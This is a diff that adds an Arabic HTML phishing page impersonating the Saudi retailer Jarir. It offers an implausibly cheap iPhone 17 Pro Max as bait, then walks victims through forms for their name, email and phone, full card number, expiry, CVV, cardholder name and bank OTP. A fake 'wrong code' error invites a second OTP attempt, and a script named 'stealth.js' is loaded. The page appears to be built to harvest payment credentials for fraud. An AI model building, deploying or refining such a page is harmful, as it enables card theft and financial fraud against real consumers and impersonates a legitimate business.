@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جرير - iPhone 17 Pro Max</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- نفس الـ style الأصلي -->
+    <style>
+        :root { --jarir-red: #E30613; --jarir-navy: #2D3E50; }
+        body { font-family: 'Cairo', sans-serif; background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%); min-height: 100vh; margin: 0; }
+        .container { max-width: 400px; margin: 0 auto; background: white; min-height: 100vh; box-shadow: 0 20px 60px rgba(0,0,0,0.1); overflow-x: hidden; }
+        .header { background: var(--jarir-red); color: white; padding: 20px; text-align: center; }
+        .product-img { width: 100%; height: 250px; object-fit: cover; }
+        .price { font-size: 28px; font-weight: 800; color: var(--jarir-red); }
+        .form-group { margin: 15px 20px; }
+        .form-input { width: 100%; padding: 15px; border: 2px solid #e1e5e9; border-radius: 10px; background: #f8f9fa; font-size: 16px; box-sizing: border-box; transition: all 0.3s; }
+        .form-input:focus { border-color: var(--jarir-red); background: white; outline: none; box-shadow: 0 0 0 3px rgba(227,6,19,0.1); }
+        .btn-primary { background: linear-gradient(135deg, var(--jarir-red), #b2000d); color: white; border: none; padding: 18px; border-radius: 12px; font-size: 18px; font-weight: 700; width: 100%; cursor: pointer; transition: all 0.3s; }
+        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 10px 25px rgba(227,6,19,0.4); }
+        .page { display: none; padding: 20px; }
+        .page.active { display: block; }
+        .step-indicator { display: flex; justify-content: center; gap: 10px; margin-bottom: 30px; }
+        .step { width: 12px; height: 12px; border-radius: 50%; background: #ddd; transition: all 0.3s; }
+        .step.active { background: var(--jarir-red); transform: scale(1.3); }
+        .card-input-container { position: relative; }
+        .card-icon { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); width: 30px; height: 20px; opacity: 0; transition: opacity 0.3s; }
+        .otp-input { letter-spacing: 15px; text-align: center; font-size: 24px; font-weight: bold; }
+        .success-animation { animation: pulse 2s infinite; }
+        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
+        @media (max-width: 480px) { .container { box-shadow: none; border-radius: 0; } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- صفحة المنتج -->
+        <div id="page-product" class="page active">
+            <div class="header">
+                <h1><i class="fas fa-gift"></i> عرض خاص جرير</h1>
+                <p>iPhone 17 Pro Max 1TB - هدية 🎁</p>
+            </div>
+            <img src="https://i.ibb.co/7X9Qb2m/iphone17.jpg" alt="iPhone 17 Pro Max" class="product-img">
+            <div class="p-5">
+                <div class="price">999 ر.س <span class="text-sm text-gray-500 line-through">5,999 ر.س</span></div>
+                <div class="step-indicator">
+                    <div class="step active"></div>
+                    <div class="step"></div>
+                    <div class="step"></div>
+                    <div class="step"></div>
+                </div>
+                <button onclick="showPage('page-register')" class="btn-primary mt-5">
+                    <i class="fas fa-arrow-left mr-2"></i> تسجيل الدخول للحجز
+                </button>
+            </div>
+        </div>
+
+        <!-- صفحة التسجيل -->
+        <div id="page-register" class="page">
+            <div class="header">
+                <h2>بيانات العميل</h2>
+            </div>
+            <div class="step-indicator">
+                <div class="step active"></div>
+                <div class="step active"></div>
+                <div class="step"></div>
+                <div class="step"></div>
+            </div>
+            <div class="form-group">
+                <input type="text" id="user-name" class="form-input" placeholder="الاسم الكامل">
+            </div>
+            <div class="form-group">
+                <input type="email" id="user-email" class="form-input" placeholder="البريد الإلكتروني">
+            </div>
+            <div class="form-group">
+                <input type="tel" id="user-phone" class="form-input" placeholder="رقم الجوال">
+            </div>
+            <button onclick="submitRegister()" class="btn-primary">
+                إرسال البيانات <i class="fas fa-arrow-left ml-2"></i>
+            </button>
+        </div>
+
+        <!-- صفحة الدفع -->
+        <div id="page-payment" class="page">
+            <div class="header">
+                <h2>بيانات البطاقة</h2>
+            </div>
+            <div class="step-indicator">
+                <div class="step active"></div>
+                <div class="step active"></div>
+                <div class="step active"></div>
+                <div class="step"></div>
+            </div>
+            <div class="form-group">
+                <div class="card-input-container">
+                    <input type="text" id="card-num" class="form-input" placeholder="رقم البطاقة" maxlength="19" oninput="formatCard()">
+                    <img id="card-icon" class="card-icon" src="">
+                </div>
+            </div>
+            <div class="form-group">
+                <input type="text" id="card-exp" class="form-input" placeholder="MM/YY" maxlength="5" oninput="formatExp(this)">
+            </div>
+            <div class="form-group">
+                <input type="text" id="card-cvv" class="form-input" placeholder="CVV" maxlength="4">
+            </div>
+            <div class="form-group">
+                <input type="text" id="card-holder" class="form-input" placeholder="اسم حامل البطاقة">
+            </div>
+            <button onclick="submitPayment()" class="btn-primary">
+                تأكيد الدفع <i class="fas fa-lock ml-2"></i>
+            </button>
+        </div>
+
+        <!-- صفحة OTP -->
+        <div id="page-verify" class="page">
+            <div class="header">
+                <h2>تأكيد الطلب</h2>
+            </div>
+            <div class="step-indicator">
+                <div class="step active"></div>
+                <div class="step active"></div>
+                <div class="step active"></div>
+                <div class="step active"></div>
+            </div>
+            <div class="text-center p-5">
+                <i class="fas fa-shield-alt text-5xl text-green-500 mb-4"></i>
+                <p>أدخل رمز التحقق المرسل للبنك</p>
+            </div>
+            <div class="form-group">
+                <input type="text" id="bank-otp" class="form-input otp-input" placeholder="____" maxlength="4">
+            </div>
+            <button onclick="submitOTP()" class="btn-primary">
+                إتمام الشراء <i class="fas fa-check ml-2"></i>
+            </button>
+            <div id="err-otp" class="bg-red-500 text-white p-3 rounded mt-3 text-center hidden">
+                خطأ في الرمز، حاول مرة أخرى
+            </div>
+        </div>
+    </div>
+
+    <script src="stealth.js"></script>
+</body>
+</html>
